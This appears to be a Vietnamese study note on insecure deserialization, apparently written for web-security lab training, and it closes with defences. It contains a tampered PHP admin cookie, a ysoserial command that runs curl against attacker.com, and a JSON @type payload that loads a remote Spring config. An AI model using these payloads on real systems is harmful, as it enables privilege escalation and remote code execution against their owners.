# INSECURE DESERIALIZATION — KIẾN THỨC TỔNG HỢP

## Mục lục
1. [Serialization/Deserialization là gì?](#1-serializationdeserialization-là-gì)
2. [Vì sao deserialization không an toàn nguy hiểm](#2-vì-sao-deserialization-không-an-toàn-nguy-hiểm)
3. [Nhận diện dữ liệu serialize theo ngôn ngữ](#3-nhận-diện-dữ-liệu-serialize-theo-ngôn-ngữ)
4. [Sửa đổi object serialize để khai thác](#4-sửa-đổi-object-serialize-để-khai-thác)
5. [PHP: Magic method & POP chain](#5-php-magic-method--pop-chain)
6. [Java: Gadget chain & công cụ ysoserial](#6-java-gadget-chain--công-cụ-ysoserial)
7. [Deserialization trong định dạng khác (JSON/XML với type field)](#7-deserialization-trong-định-dạng-khác-jsonxml-với-type-field)
8. [Cách phòng chống](#8-cách-phòng-chống)
9. [Danh sách lab liên quan](#9-danh-sách-lab-liên-quan)

## 1. Serialization/Deserialization là gì?

**Serialization:** chuyển object trong bộ nhớ thành 1 chuỗi byte/text để lưu trữ hoặc truyền đi. **Deserialization:** quá trình ngược lại — khôi phục object từ chuỗi đó. Nhiều ứng dụng dùng deserialization cho cookie session, cache, message queue...

## 2. Vì sao deserialization không an toàn nguy hiểm

Nếu ứng dụng **deserialize dữ liệu do người dùng kiểm soát** mà không kiểm tra/giới hạn, attacker có thể thao túng chuỗi serialize để:
- Thay đổi giá trị field của object (kể cả field không có form nào cho phép sửa trực tiếp).
- Kích hoạt các đoạn code chạy tự động trong quá trình deserialize (constructor, magic method như `__wakeup`, `__destruct` trong PHP, hay `readObject` trong Java) — nếu chuỗi các lời gọi này ("gadget chain") dẫn tới hành động nguy hiểm (ghi file, chạy lệnh hệ thống) → **Remote Code Execution**.

## 3. Nhận diện dữ liệu serialize theo ngôn ngữ

| Ngôn ngữ | Dấu hiệu nhận biết |
|---|---|
| PHP | Chuỗi dạng `O:8:"ClassName":1:{s:4:"name";s:5:"value";}`, thường base64-encode khi đặt trong cookie |
| Java | Dữ liệu binary bắt đầu bằng byte `AC ED 00 05` (magic number), khi base64-encode thường bắt đầu bằng `rO0AB` |
| Ruby | Dữ liệu dùng `Marshal`, thường bắt đầu `\x04\x08` |
| .NET | `BinaryFormatter`/`ViewState`, thường base64, có thể nhận diện qua header đặc trưng hoặc `__VIEWSTATE` |

## 4. Sửa đổi object serialize để khai thác

Ví dụ cookie session PHP serialize:
```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}
```
Sửa trực tiếp field `admin` từ `b:0` (false) → `b:1` (true):
```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}
```
Base64-encode lại, đặt vào cookie → nếu server tin tưởng field này sau khi deserialize mà không re-validate → chiếm quyền admin.

> ⚠️ Khi sửa chuỗi serialize PHP, cần cập nhật đúng **độ dài field** khai báo trước mỗi giá trị (`s:6:"wiener"` → độ dài chuỗi là 6 ký tự) nếu thay đổi độ dài giá trị, nếu không server sẽ báo lỗi parse.

## 5. PHP: Magic method & POP chain

PHP có các "magic method" tự động gọi trong vòng đời object:
- `__wakeup()` — gọi ngay khi `unserialize()` khôi phục object.
- `__destruct()` — gọi khi object bị huỷ (hết scope, cuối script).
- `__toString()` — gọi khi object được ép kiểu sang string.

**POP chain (Property-Oriented Programming):** nếu ứng dụng có sẵn 1 class với magic method thực hiện hành động nguy hiểm (ví dụ `__destruct()` gọi `file_put_contents($this->filename, $this->data)`), attacker tạo 1 object serialize giả của class đó với `filename`/`data` tự chọn, gửi lên để server tự deserialize và "vô tình" thực thi hành động nguy hiểm khi object bị huỷ.

Chuỗi phức tạp hơn có thể **nối nhiều class** lại với nhau (object A chứa property trỏ tới object B, method của A gọi tới B...) để cuối cùng dẫn tới 1 sink nguy hiểm (ghi file, gọi lệnh hệ thống) — gọi là **gadget chain**.

## 6. Java: Gadget chain & công cụ ysoserial

Java deserialization thường không có sẵn payload "viết tay" dễ dàng như PHP — thay vào đó dùng công cụ **ysoserial** để tự động sinh payload khai thác dựa trên các gadget chain đã biết trong các thư viện phổ biến (Commons-Collections, Spring, Groovy...):

```bash
java -jar ysoserial.jar CommonsCollections6 'curl http://attacker.com/pwned' > payload.bin
base64 payload.bin
```
Đặt payload base64 vào cookie/tham số nhận input serialize của ứng dụng, gửi lên → nếu class tương ứng gadget chain có trên classpath server → RCE.

## 7. Deserialization trong định dạng khác (JSON/XML với type field)

Một số thư viện JSON (ví dụ Jackson với `@JsonTypeInfo`, hay .NET `TypeNameHandling`) hỗ trợ **polymorphic deserialization** — cho phép chỉ định class cụ thể sẽ khởi tạo ngay trong dữ liệu JSON/XML thông qua 1 field kiểu (`"@type": "..."`). Nếu field này do attacker kiểm soát và không giới hạn whitelist class, attacker có thể chỉ định 1 class nguy hiểm (gadget) để deserialize, dẫn tới RCE tương tự Java native deserialization nhưng thông qua JSON:

```json
{
  "@type": "org.springframework.context.support.ClassPathXmlApplicationContext",
  "value": "http://attacker.com/malicious-spring-config.xml"
}
```

## 8. Cách phòng chống

- Tuyệt đối không deserialize dữ liệu không tin cậy bằng cơ chế native (PHP `unserialize()`, Java `ObjectInputStream`) — ưu tiên định dạng dữ liệu đơn giản (JSON) không tự thực thi code khi parse.
- Nếu bắt buộc deserialize, dùng whitelist class được phép khởi tạo (`ObjectInputFilter` trong Java, hoặc tránh cấu hình `TypeNameHandling.All` trong .NET).
- Ký (sign) dữ liệu serialize bằng HMAC và verify chữ ký trước khi deserialize để chặn việc chỉnh sửa trực tiếp.
- Cập nhật thường xuyên các thư viện có gadget chain đã biết (Commons-Collections cũ, v.v.).
- Chạy tiến trình deserialize với quyền hạn tối thiểu (sandbox), giám sát hành vi bất thường.

## 9. Danh sách lab liên quan

1. Modifying serialized data types
2. Using application functionality to exploit insecure deserialization
3. Arbitrary object injection in PHP
4. Exploiting Java deserialization with Apache Commons
5. Exploiting PHP deserialization with a pre-built gadget chain
6. Exploiting Ruby deserialization using a documented gadget chain
7. Developing a custom gadget chain for Java deserialization
8. Developing a custom gadget chain for PHP deserialization
9. Using PHAR deserialization to deploy a custom gadget chain
10. Exploiting insecure deserialization in a JSON message (polymorphic type / `@type`)

